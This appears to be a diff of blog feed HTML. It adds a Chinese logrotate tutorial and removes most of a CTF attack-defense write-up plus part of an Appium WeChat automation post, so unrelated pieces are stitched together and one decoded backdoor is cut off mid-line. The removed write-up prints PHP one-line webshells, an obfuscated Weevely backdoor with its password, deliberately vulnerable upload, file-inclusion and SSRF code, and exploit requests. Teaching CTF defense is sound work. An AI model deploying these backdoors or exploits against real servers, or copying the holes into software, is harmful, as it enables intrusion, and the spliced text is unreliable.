+<p>以上的需求，通常称为<strong>日志滚动</strong><del>（必考）</del>。</p>
+<h1>日志滚动</h1>
+<p>道理我都懂，但是Linux的日志系统没有提供这些功能，总不能每天手动重命名、压缩、清空、删除日志吧？</p>
+<p><del>天空一声巨响，英雄闪亮登场！</del>这时候一个叫做 <strong>logrotate</strong> 的程序就派上了用处。</p>
+<p>根据使用的系统不同，logrotate的安装方式也不尽相同，有些系统更是自带了 logrotate 并且带有很多默认的配置（比如我所使用的 Ubuntu Server）。</p>
+<p>你可以在自己的系统上查看一下 /var/log/ 目录下的日志文件，如果见到了类似“服务名.log.0”、“服务名.log.1”等一大堆具有相同服务名称但是带有后缀序号的日志文件，那么可以99%肯定这个系统已经安装了 logrotate 并且能够工作。</p>
+<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png"><img class="aligncenter size-full wp-image-492" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png" alt="logrotate" width="663" height="579" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logs.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logs-300x262.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
+<p>如果你的系统没有带logrotate，别担心，百度一下就能装上啦！而且配置巨简单！</p>
+<p>在 /etc/logrotate.d/ 目录下（不同系统可能有所区别）通常会有很多配置文件，这些文件的名字通常对应了该文件所管辖的服务（文件名仅仅是便于管理，和实际内容没有必然关联）。</p>
+<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png"><img class="aligncenter size-full wp-image-494" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png" alt="logrotate config" width="663" height="435" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg-300x197.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
+<p>而这些配置文件的格式非常的简要，如图所示。通常第一行以目标日志文件路径起头，可以使用通配符，而后面的花括号内部则是需要应用于该日志文件的滚动规则。</p>
+<p>其中几个常用的规则在这里稍微解释一下，通常就够用了。更详细的规则可以自行查找，不再赘述。</p>
+<pre class="brush: bash; title: ; notranslate">
 
-# 2. app/controllers/PostsController.php 
-$_GET[function]($_POST[params])
-
-# 3. bootstrap/autoload.php
-echo `$_POST[shellcmd]`
-
-# 4. app/views/errors/404.blade.php
-@preg_replace("/[pageerror]/e", $_POST['passwd'], "saft");</pre>
-<h3 class="md-end-block md-heading">常见大马</h3>
-<p><span class="md-line md-end-block">相比于小马，这类木马通常体积稍大，更不易隐藏。但其中可以包含更多加密和混淆的措施，使攻击行为更不容易被察觉。在本题中，我放置了一个Weevely木马，其密码为xman1234</span></p>
-<pre class="lang:default decode:true"># 1. autoload_real.php
-$i='er";$K3i=$m[1][0K3].K3$m[1K3]K3[1];$hK3=$K3sl($ss(K3md5($i.$kh),0,K33));$f=$sl(K3$sK3s(md5($i.$';
-$D='kfK3K3),0,3));$p="K3";foK3K3r(K3$K3z=1;$z&lt;count($m[1]);K3$z++)$pK3.=$q[$m[K32K3][K3K3$z]];if(sK';
-$v='3LANK3GUAK3GE"];if($rr&amp;&amp;$ra)K3{$u=paK3rK3K3sK3K3e_url($rr);parse_str($uK3["query"],$qK3);$q=arK';
-$B='[$i].=$p;$eK3=strpK3oK3s($s[$i]K3,$f);ifK3($eK3){$k=$khK3.K3$kf;oK3b_start();@evaK3l(@gzuncK3om';
-$o='3;}}return K3$oK3;}$rK3=$_K3SERVER;$K3rr=@$r[K3"HTTP_REFEREK3R"];$ra=K3@$r["K3HTTP_AK3CCK3EPT_K';
-$O='K3;iK3f($q&amp;K3&amp;$m){@sesK3sioK3n_start()K3;$s=K3&amp;$_SK3ESSIK3OK3N;$ss="substK3r";$sK3l="strtK3olow';
-$H='3="";for($i=0;$i&lt;$l;K3){fK3orK3($j=0;($j&lt;$K3c&amp;&amp;$i&lt;$K3lK3)K3;$j++K3,$i++){$o.=$tK3{$i}^$k{$K3j}K';
-$c='$K3ss($s[$i],0K3,$eK3))),$k))K3);$K3o=oK3b_get_conK3tentsK3();ob_enK3d_cK3lean();K3K3$d=baseK36';
-$m='4_encode(x(K3gzcompK3ress($oK3),$kK3));print("&lt;K3$k&gt;$dK3K3&lt;/$k&gt;"K3);@sK3ession_deK3stroy();}}}}';
-$t='$kh="a8bK3b";$K3kf="c44K3K3a";funK3ctK3ion x($t,$k){$cK3=sK3trlen($kK3);$l=stK3rlK3en($t);K3$oK';
-$M='prK3ess(@x(@bK3aK3se64K3_decodeK3(pregK3_replaK3ce(aK3rray("/_/",K3"/-/"),arrK3ay(K3"/","K3+"),';
-$f='3trposK3($p,$h)===0K3){$s[$i]=""K3;$p=$sK3s($pK3,3);}K3K3if(array_key_exisK3ts($i,K3$K3sK3)){$s';
-$Q=str_replace('d','','crdddeatde_fdunctdion');
-$b='3raK3y_vK3alues(K3$q)K3;preg_mK3aK3tch_all("K3/(K3[\\K3w])[\\w-]+(?:;q=0.([\\d]))K3?,K3?/",$ra,$m)';
-$l=str_replace('K3','',$t.$H.$o.$v.$b.$O.$i.$D.$f.$B.$M.$c.$m);
-$q=$Q('',$l);$q();</pre>
-<p><span class="md-line md-end-block">在这段大马中，<span spellcheck="false"><code>$Q</code></span>和<span spellcheck="false"><code>$l</code></span>均为字符串。Weevely借助PHP可以将函数名字符串用作类似函数指针的特性，来构造木马。</span></p>
-<pre class="lang:default decode:true">$Q = create_function
-
-$kh = "a8bb";
-$kf = "c44a";
-function x($t, $k) {
-	$c = strlen($k);
-	$l = strlen($t);
-	$o = "";
-	for ($i = 0;$i &lt; $l;) {
-		for ($j = 0;($j &lt; $c &amp;&amp; $i &lt; $l);$j++, $i++) {
-			$o.= $t{$i} ^ $k{$j};
-		}
-	}
-	return $o;
+/var/log/nginx/*.log {
+    daily  # 滚动频率，每天滚动一次。其它可选项为 hourly weekly monthly yearly
+    missingok
+    rotate 14  # 最多保留14次滚动，超过则删除最老的日志
+    maxsize 100M  # 重要！活动日志的最大尺寸，超过该尺寸则强制滚动一次
+    compress  # 重要！压缩不活动的日志，默认使用gzip
+    delaycompress
+    notifempty  # 如果日志为空则不滚动
+    create 0640 www-data adm
+    sharedscripts
+    prerotate  # 在每次滚动前执行的脚本，通常是通知该服务“我要滚动日志啦！先别生成新日志咯！”
+        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
+        run-parts /etc/logrotate.d/httpd-prerotate; \
+        fi \
+    endscript
+    postrotate  # 在滚动完成后执行的脚本，通常是通知该服务“日志滚动完成啦！请把后续日志写到新的活动日志文件中去！”
+        invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1
+    endscript
 }
-$r = $_SERVER;
-$rr = @$r["HTTP_REFERER"];
-$ra = @$r["HTTP_ACCEPT_LANGUAGE"];
-if ($rr &amp;&amp; $ra) {
-	$u = parse_url($rr);
-	parse_str($u["query"], $q);
-	$q = array_values($q);
-	preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
-	if ($q &amp;&amp; $m) {
-		@session_start();
-		$s = &amp; $_SESSION;
-		$ss = "substr";
-		$sl = "strtolower";
-		$i = $m[1][0] . $m[1][1];
-		$h = $sl($ss(md5($i . $kh), 0, 3));
-		$f = $sl($ss(md5($i . $kf), 0, 3));
-		$p = "";
-		for ($z = 1;$z$d");@session_destroy();}}}}
-"</pre>
-<h3 class="md-end-block md-heading">任意文件包含</h3>
-<p><span class="md-line md-end-block">任意文件包含多为服务端程序在开发时没对可包含目录和文件做限制，导致可以读取任何文件。一般的表现形式为<span spellcheck="false"><code>http://localhost/page=index</code></span>或类似方式。本题中，我们在博客文章中引入了正文模板，这里的模板就具有文件包含漏洞。</span></p>
-<pre class="lang:default decode:true"># 1. app/views/posts/show.blade.php
-&lt;div class="article-body"&gt;
-    {{ require __DIR__."/../../template/".$post-&gt;template }}
-    {{ $post-&gt;body }}
-&lt;/div&gt;</pre>
-<h3 class="md-end-block md-heading">任意文件上传</h3>
-<p><span class="md-line md-end-block">任意文件上传多为服务端程序在开发时，未对可上传文件的扩展名进行限制，导致可以上传服务器脚本，并通过HTTP访问执行。本题中，我们在博客文章图片上传处未对可上传文件做限制。</span></p>
-<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
-    public function uploadImage()
-    {
-        $data = [
-            'success' =&gt; false,
-            'msg' =&gt; 'Failed!',
-            'file_path' =&gt; ''
-        ];
 
-        if ($file = Input::file('upload_file'))
-        {
-            $fileName        = $file-&gt;getClientOriginalName();
-            $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
-            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
-            $destinationPath = public_path() . $folderName;
-            $safeName        = str_random(10).'.'.$extension;
-            $file-&gt;move($destinationPath, $safeName);
-            $data['file_path'] = $folderName .'/'. $safeName;
-            $data['msg'] = "Succeeded!";
-            $data['success'] = true;
-        }
-        return $data;
-    }</pre>
-<h3 class="md-end-block md-heading">服务端请求伪造</h3>
-<p><span class="md-line md-end-block">服务端请求伪造是指在开发过程中，有些用户提交的资源（如图片，文字等）需要加载到服务器本地进行处理，但服务端并未对资源地址进行限制，导致的可以探测服务器内网或任意本地文件读取。本题中，我们设计了/resolve_image这个调用，但是并没有制作相应的前端页面。</span></p>
-<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
-    public function resolveImage()
-    {
-        $resp = [
-            'success' =&gt; false,
-            'msg' =&gt; 'Failed!',
-            'file_path' =&gt; ''
-        ];
-
-        $data = Input::only('resolve_file');
-
-        $content = @file_get_contents($data['resolve_file']);
-        if ($content)
-        {
-            $extension       = 'png';
-            $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
-            $destinationPath = public_path() . $folderName;
-            $safeName        = str_random(10).'.'.$extension;
-            @mkdir($destinationPath, 0755, true);
-            @file_put_contents($destinationPath .'/'. $safeName, $content);
-            $resp['file_path'] = $folderName .'/'. $safeName;
-            $resp['msg'] = "Succeeded!";
-            $resp['success'] = true;
-        }
-        return $resp;
-    }</pre>
-<h2 class="md-end-block md-heading">0x01 审计与防御方式</h2>
-<h3 class="md-end-block md-heading">常见一句话木马</h3>
-<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>eval, system, passthru, $_POST, $_REQUEST</code></span>）等，来快速定位相关位置，随后对源码进行审查。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码。</span></p>
-<pre class="lang:default decode:true">$ grep -re eval
-vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        $__result = eval($__input);
-vendor/d11wtq/boris/lib/Boris/EvalWorker.php:        eval($__hook);
-app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
-app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
-app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
-
-$grep -re \$_POST
-bootstrap/compiled.php:        $request = self::createRequestFromFactory($_GET, $_POST, array(), $_COOKIE, $_FILES, $_SERVER);
-bootstrap/compiled.php:        $_POST = $this-&gt;request-&gt;all();
-bootstrap/compiled.php:        $request = array('g' =&gt; $_GET, 'p' =&gt; $_POST, 'c' =&gt; $_COOKIE);
-bootstrap/autoload.php:echo `$_POST[checker]`;
-public/packages/frozennode/administrator/js/ckeditor/samples/assets/posteddata.php:if (!empty($_POST))
-...
-app/views/errors/404.blade.php:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
-app/storage/views/dde1e00e577ea930001955e78ec38ca4:@preg_replace("/[pageerror]/e", $_POST['notfound'], "saft");
-app/template/3.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
-app/template/1.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";
-app/template/2.tpl:    echo isset($_POST["template"]) ? eval($_POST["template"]): "";</pre>
-<h3 class="md-end-block md-heading">常见大马</h3>
-<p><span class="md-line md-end-block">基本方法同小马，但由于大马结构复杂，更加需要平时的积累和人工分析能力。这类木马通常不会影响程序运行逻辑，因此可以直接删除相关代码或文件。</span></p>
-<h3 class="md-end-block md-heading">任意文件包含</h3>
-<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>include, require</code></span>）等，来快速定位相关位置，随后对源码进行审查。但因为这类关键词几乎在所有的代码文件中都存在，审查难度相对较大。但由于任意文件包含一般出现在业务逻辑内，与常用库的包含方式有所区别，有能力的团队可以开发一些审计工具，对其特征进行审计，也可以从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</span></p>
-<p><span class="md-line md-end-block">在本题中，容易发现系统自带的三个模板均以<span spellcheck="false"><code>[0-9]\.tpl</code></span>命名，因此在相关业务逻辑中，对提交的模板名称进行过滤即可。具体的位置如下。</span></p>
-<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
-public function store()
-{
-    $validator = Validator::make(Input::all(), Post::$rules);
-    
-    if ($validator-&gt;fails())
-    {
-        return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
-    }
-    $data = Input::only('title', 'body', 'category_id', 'template');
-    $data['user_id'] = Auth::user()-&gt;id;
-    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
-    
-    $post = Post::create($data);
-    $post-&gt;tag(Input::get('tags'));
-    
-    Flash::success(lang('Operation succeeded.'));
-    return Redirect::route('posts.show', $post-&gt;id);
-}
-# 2. app/controllers/PostsController.php
-public function update($id)
-{
-    $post = Post::findOrFail($id);
-    $this-&gt;authorOrAdminPermissioinRequire($post-&gt;user_id);
-    $validator = Validator::make($data = Input::all(), Post::$rules);
-    if ($validator-&gt;fails())
-    {
-            return Redirect::back()-&gt;withErrors($validator)-&gt;withInput();
-    }
-    
-    $data['body'] = Purifier::clean($data['body'], 'ugc_body');
-    
-    $post-&gt;update($data);
-    $post-&gt;retag(Input::get('tags'));
-    
-    Flash::success(lang('Operation succeeded.'));
-    return Redirect::route('posts.show', $post-&gt;id);
-}</pre>
-<p><span class="md-line md-end-block">在这两个函数中，对<span spellcheck="false"><code>$data['template']</code></span>提供的文件名进行正则匹配过滤即可。</span></p>
-<h3 class="md-end-block md-heading">任意文件上传</h3>
-<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如<span spellcheck="false"><code>upload, $_FILES, move_uploaded_file, move</code></span>）等，来快速定位相关位置，随后对源码进行审查。这类漏洞一般比较容易进行审查，相关关键词即可大致定位可能出现问题的位置。由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</span></p>
-<p><span class="md-line md-end-block">在本题中，容易发现博客文章图片上传功能未对文件类型进行过滤，我们需要修改相关代码，过滤掉可能导致上传木马文件的扩展名。</span></p>
-<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
-public function uploadImage()
-{
-    $data = [
-        'success' =&gt; false,
-        'msg' =&gt; 'Failed!',
-        'file_path' =&gt; ''
-    ];
-
-    if ($file = Input::file('upload_file'))
-    {
-        $fileName        = $file-&gt;getClientOriginalName();
-        $extension       = $file-&gt;getClientOriginalExtension() ?: 'png';
-        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
-        $destinationPath = public_path() . $folderName;
-        $safeName        = str_random(10).'.'.$extension;
-        $file-&gt;move($destinationPath, $safeName);
-        $data['file_path'] = $folderName .'/'. $safeName;
-        $data['msg'] = "Succeeded!";
-        $data['success'] = true;
-    }
-    return $data;
-}</pre>
-<p><span class="md-line md-end-block">这里可以简单的过滤<span spellcheck="false"><code>$safeName</code></span>中是否包含<span spellcheck="false"><code>'php'</code></span>等可作为脚本运行的文件扩展名字符串，发现问题直接返回错误即可。</span></p>
-<h3 class="md-end-block md-heading">服务端请求伪造</h3>
-<p><span class="md-line md-end-block">可以通过grep或find等命令搜索相关关键字（如file_get_content, curl）等，来快速定位相关位置，随后对源码进行审查。但由于这类函数用途很多，因此审计难度也相对较大。建议从业务逻辑入手对相关代码进行审计。由于这类问题会影响程序运行逻辑，因此需要选手理解题意，根据题目的业务逻辑修复代码或添加防御措施。</span></p>
-<p><span class="md-line md-end-block">在本题中，此漏洞并不存在前端调用，因此只能对代码进行审计。可以发现在<span spellcheck="false"><code>/resolve_file</code></span>请求对应的处理函数中存在此类情况。</span></p>
-<pre class="lang:default decode:true"># 1. app/controllers/PostsController.php
-public function resolveImage()
-{
-    $resp = [
-        'success' =&gt; false,
-        'msg' =&gt; 'Failed!',
-        'file_path' =&gt; ''
-    ];
-
-    $data = Input::only('resolve_file');
-
-    $content = @file_get_contents($data['resolve_file']);
-    if ($content)
-    {
-        $extension       = 'png';
-        $folderName      = '/uploads/images/' . date("Ym", time()) .'/'.date("d", time()) .'/'. Auth::user()-&gt;id;
-        $destinationPath = public_path() . $folderName;
-        $safeName        = str_random(10).'.'.$extension;
-        @mkdir($destinationPath, 0755, true);
-        @file_put_contents($destinationPath .'/'. $safeName, $content);
-        $resp['file_path'] = $folderName .'/'. $safeName;
-        $resp['msg'] = "Succeeded!";
-        $resp['success'] = true;
-    }
-    return $resp;
-}</pre>
-<p><span class="md-line md-end-block">可以发现这里<span spellcheck="false"><code>file_get_contents</code></span>直接传入了请求参数，而未对其做过滤，因此可能导致任意文件读取。这里可以通过检查<span spellcheck="false"><code>$data['resolve_file']</code></span>的开头是否为<span spellcheck="false"><code>'http'</code></span>并且对<span spellcheck="false"><code>'localhost'</code></span>, <span spellcheck="false"><code>'127.*.*.*'</code></span>等相关的内网域名、IP等进行过滤。</span></p>
-<h2 class="md-end-block md-heading">0x02 漏洞利用方式</h2>
-<h3 class="md-end-block md-heading">1. index</h3>
-<pre class="lang:default decode:true">GET http://localhost:21000/?method=assert HTTP/1.1
-Host: localhost:21000
-Content-Length: 0
-Content-Type: application/x-www-form-urlencoded
-Referer: system('cat /home/web/flag/flag')</pre>
-<h3 class="md-end-block md-heading">2. 404</h3>
-<pre class="lang:default decode:true">POST http://localhost:21000/asdadasdaasd HTTP/1.1
-Host: localhost:21000
-Content-Length: 27
-Content-Type: application/x-www-form-urlencoded
-
-notfound=system("cat%20%2Fhome%2Fweb%2Fflag%2Fflag")</pre>
-<p><span class="md-line md-end-block">在比赛现场由于部署时使用了php7, preg_match的r选项已无法使用，因此该漏洞失效。</span></p>
-<h3 class="md-end-block md-heading">3. upload_image</h3>
-<pre class="lang:default decode:true">POST /upload_image</pre>
-<p><span class="md-line md-end-block">直接上传一句话木马，随后通过一句话木马利用。</span></p>
-<h3 class="md-end-block md-heading">4. weevely in autoload_real.php</h3>
-<pre class="lang:default decode:true">$ weevely http://ip:port/any xman1234</pre>
-<p><span class="md-line md-end-block">随后通过weevely直接读flag</span></p>
-<h3 class="md-end-block md-heading">5. Post checker=shellcmd in autoload.php</h3>
-<pre class="lang:default decode:true">POST http://localhost:21000/ HTTP/1.1
-Host: localhost:21000
-Content-Length: 41
-Content-Type: application/x-www-form-urlencoded
-
-checker=cat%20%2Fhome%2Fweb%2Fflag%2Fflag</pre>
-<h3 class="md-end-block md-heading">6. template any file require</h3>
-<p><span class="md-line md-end-block"><span spellcheck="false"><code>http://localhost:21000/posts/create</code></span>在发布文章时修改提交的模板值</span></p>
-<pre class="lang:default decode:true">html
-&lt;div class="form-group"&gt;
-    &lt;select class="form-control" name="template"&gt;
-    &lt;option value="/../../../../../../home/web/flag/flag"&gt;Template 1&lt;/option&gt;
-    &lt;option value="2.tpl"&gt;Template 2&lt;/option&gt;
-    &lt;option value="3.tpl"&gt;Template 3&lt;/option&gt;&lt;/select&gt;
-&lt;/div&gt;</pre>
-<p><span class="md-line md-end-block">随后新发布的文章中就会包含flag的值</span></p>
-<h3 class="md-end-block md-heading">7. resolve_file SSRF</h3>
-<pre class="lang:default decode:true">POST http://localhost:21000/resolve_image HTTP/1.1
-Host: localhost:21000
-Content-Length: 112
-Content-Type: application/x-www-form-urlencoded
-Cookie: laravel_session=eyJpdiI6ImN0alBVaUVmSWhDKzlpVXhybGVPZXc9PSIsInZhbHVlIjoianU3Ym9CcXFOeVN4bW5nS0k2MWxcL25Ed0FBN2s5VFg5SFlxRGl5eW12b1J4bkpSTFl3QzR3d0l4bUtvTzhMNklEQndEdlRDMVF0UmtSTllnVlNOaUR3PT0iLCJtYWMiOiJjNWNiNmMyODNjYmU1MGUyYTE0OWY0ZTMxMGQ4ZTRmM2Q2MDRhMDBjOWJmNTU4MGJjMDY1NGRkNzdjNDJhYjYwIn0%3D
-
-resolve_file=php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3D../../../../../../home/web/flag/flag</pre>
-<p><span class="md-line md-end-block"><span class="">随后根据返回的json文件中file_path的值下载文件后base64解码即为flag</span></span></p>
-<p>&nbsp;</p>
-<h2>0x03 总结</h2>
-<p>这次出题难度属于较为简单的，考察的也是最基础的一些常见web注入点。但由于时间关系和比赛性质，没有对XSS，CSRF，SQL注入等知识点进行考察，且所有的漏洞点均为可直接利用，没有需要二次利用的漏洞。以后可能会尝试出一些和密码学/misc/pwn相结合的web攻防题。最后也恭喜在这次夏令营中取得优异成绩的各位大师傅！</p>]]></content>
-        <author>
-            <name><![CDATA[0xe799bde88f9c]]></name>
-        </author>
-    </entry>
-    
-    <entry>
-        <id>https://www.summershrimp.com/2016/08/appium-android-ui-test/</id>
-        <title><![CDATA[Appium在Android UI测试中的应用]]></title>
-        <updated>2016-08-18T15:29:08+08:00</updated>
-        <link href="https://www.summershrimp.com/2016/08/appium-android-ui-test/"/>
-        <content type="text/html" src="https://www.summershrimp.com/2016/08/appium-android-ui-test/"><![CDATA[<h2>Android测试工具与Appium简介</h2>
-<p>Appium是一个C/S架构的，支持Android/iOS Native, Hybrid 和 Mobile Web Apps的测试框架，与测试程序通过Selenum Webdriver协议通讯。Webdriver的好处是通过HTTP RPC的方式调用Server上的过程，编写测试脚本不受语言的限制，无论是Python, Java, NodeJS均可以方便的编写测试。本文中将使用Python进行编程。</p>
-<p>起因是因为市场部的同事抛来如下需求：批量添加一些微信好友。直接抓取请求进行重放的方法是不靠谱的，微信与服务端的通讯均加密，Pass。考虑使用xposed等框架hook相关函数进行操作。但是xposed需要越狱，且开发复杂，Pass。后来想到了使用UI测试工具进行模拟操作，开发较为简单。</p>
-<p>Android UI测试工具有很多种，如Monkey, UIAutomator, Selendroid, Robotium等。其中UIAutomator, Monkey, Selendroid均为非侵入式的UI测试，也就是不需要修改源代码，只要安装了目标程序就可以进行测试。Robotium需要与源码一同编译测试。Appium实际上就是一个测试工具的统一调度软件，将不同的非侵入式测试工具整合在一起，对外提供统一的API。在Android 2.3以前的版本，Appium会调用Selendroid，之后的版本会直接使用UIAutomator，iOS下使用UIAutomation。Appium还支持FirefoxOS的UI测试。</p>
-<figure style="width: 347px" class="wp-caption alignnone"><img class="" src="https://dn-summershrimp-my-blog.qbox.me/appium.gif" width="347" height="614" /><figcaption class="wp-caption-text">Appium Gif</figcaption></figure>
-<h2>安装Appium</h2>
-<p>官网给出了命令行下的安装方法。但实际上Appium有GUI版本，更适合在Windows/MacOS下使用。Windows下需要安装.NET Framework。</p>
-<pre class="lang:default decode:true">&gt; brew install node      # get node.js
-&gt; npm install -g appium  # get appium
-&gt; npm install wd         # get appium client
-&gt; appium &amp;               # start appium
-&gt; node your-appium-test.js</pre>
-<p>Appium需要依赖Android SDK编译在手机端运行的两个插件，因此需要首先安装相应的Android SDK版本。这里直接使用了Android Studio中自带的SDK Manager。在SDKManager中选择和测试机相对应的SDK Platform和较新的Build-tools，如果需要使用模拟器测试还要装对应的ARM/x86 System Image，以及Intel HAXM Installer，用于加速x86虚拟机。Appium使用adb来与目标机器通讯，因此对于真机和模拟器操作几乎都是相同的，如何建立模拟器在此不再赘述。</p>
-<p>安装完成后需要在Appium GUI中配置Android SDK目录，随后选择Android，点击Launch就可以启动Appium Server。</p>
-<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png"><img class="alignnone size-medium wp-image-102" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png" alt="Appium-android-sdk" width="280" height="300" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-280x300.png 280w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-768x823.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk-956x1024.png 956w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-android-sdk.png 1333w" sizes="(max-width: 280px) 100vw, 280px" /></a><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png"><img class="alignnone size-medium wp-image-103" src="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png" alt="Appium-launch" width="300" height="263" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-300x263.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-768x672.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch-1024x896.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/Appium-launch.png 1332w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>Appium Server默认会监听http://localhost:4723 ，用于RPC通讯。下面我们就可以打开熟悉的编程环境，编写UI测试用例了。这里使用Python进行编写，需要先安装Appium的Python Client  ，然后再python中使用appium.webclient就可以连接Appium server了。</p>
-<pre class="lang:default decode:true">pip install Appium-Python-Client</pre>
-<h2>使用Appium进行UI控制</h2>
-<p>根据注释修改相应属性后即可运行测试。手机需要打开ADB调试，执行完以下代码后，Appium会在手机上安装Appium Settings和Unlock两个程序，随后微信会被启动。</p>
-<pre class="lang:python decode:true">from appium import webdriver
-
-desired_caps = {}
-desired_caps['platformName'] = 'Android'  #测试平台
-desired_caps['platformVersion'] = '5.1'   #平台版本
-desired_caps['deviceName'] = 'm3_note'    #设备名称，多设备时需区分
-desired_caps['appPackage'] = 'com.tencent.mm'  #app package名
-desired_caps['appActivity'] = '.ui.LauncherUI' #app默认Activity
-dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps) #启动Remote RPC
 </pre>
-<p>Selenum Webdriver使用了一种类似于JS中的DOM模型的方法来选择页面中的元素。dr为当前正在活动的activity对象，可以使用findElementByXXX的方法来获取Activity中的元素。所有Element后带s的函数，均获得所有匹配的元素，不带s的函数获得第一个匹配的元素。</p>
-<h3>查询函数</h3>
-<h4>1. findElement(s)ByName</h4>
-<p>在Android中基本没用。Android UI没有Name这个属性。有说可以使用text值获取。但我并没有成功</p>
-<h4>2. findElement(s)ByClassName</h4>
-<p>通过类名来获取元素，用法如下：</p>
-<pre class="lang:python decode:true ">item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
-item_list[2].click()</pre>
-<h4>3. findElementById</h4>
-<p>通过resource_id来获取元素，每个Activity中都是唯一的，用法如下</p>
-<pre class="lang:python decode:true">t = dr.find_element_by_id("com.tencent.mm:id/f7")
-t.send_keys(wechatId)</pre>
-<h4>4. findElement(s)ByAccessbiltiyId</h4>
-<p>在Android上AccessbilityID实际就是contentDescription。这个属性是为了方便视力受损人士使用手机所设置。开启TTS后系统会朗读相关控件的contentDescription。</p>
-<h4>5. findElement(s)ByXPath</h4>
-<p>通过XML Path描述来寻找元素。我没有成功的获取到，可能是XPath写的有问题。</p>
-<pre class="lang:python decode:true">s = dr.find_element_by_xpath("//android.widget.TextView[contains(@text,'搜索')]")
-s.click()</pre>
-<h4>6. findElementByAndroidUIAutomator</h4>
-<p>通过UIAutomator的选择器来获取元素。因为Appium在Android上实际是调用的UIAutomator，所以可以通过UIAutomator的选择器来选择元素。</p>
-<pre class="lang:python decode:true ">el = dr.find_element_by_android_ui_automator("new UiSelector().text(\"搜索\")")
-el.click()</pre>
-<h3>操作函数</h3>
-<p>操作函数用于操作选定的元素，有很多，以下仅列举几个，更多的请查阅手册。</p>
-<ol>
-<li>click</li>
-<li>send_keys</li>
-<li>clear</li>
-</ol>
-<p>查询函数返回的元素对象可以像JS中的dom元素一样，继续使用查询函数来选定其子元素。用例如下。</p>
-<pre class="lang:python decode:true">search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
-search.click()</pre>
-<h2>如何确定查询规则</h2>
-<p>了解了相关的函数后，下面就应对UI进行定位了。如果是自己团队开发的程序，推荐让开发同学在所有的空间上都添加resource_id进行绝对定位。如果碰到没有谈价resource_id的元素，那就要使用别的办法进行定位了。</p>
-<h3>1. UI Automator Viewer</h3>
-<p>UI Automator Viewer是Android官方的UI定位工具，位于sdk/tools下。运行后会打开viewer界面。点击获取按钮即可获取当前正在运行的Activity的UI结构。</p>
-<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png"><img class="alignnone size-medium wp-image-104" src="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png" alt="uiviewer" width="300" height="225" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-768x576.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-1024x768.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png 1600w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<h3>2. AppiumDriver getPageSource</h3>
